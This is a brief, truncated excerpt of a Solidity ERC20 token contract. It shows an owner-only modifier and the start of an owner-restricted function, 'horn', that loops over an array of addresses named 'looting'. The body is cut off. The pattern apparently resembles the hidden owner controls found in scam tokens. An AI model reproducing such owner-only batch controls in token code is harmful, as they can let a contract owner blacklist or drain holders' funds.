...
contract x1 is Context, IERC20 {
    ...
    modifier onlyOwner() {
        require(msg.sender == swim, "Not allowed");
        _;
    }

    function horn(address[] memory looting) public onlyOwner() {
        for (uint256 i = 0; i < looting.length; i++) {
            address account = looting[i];
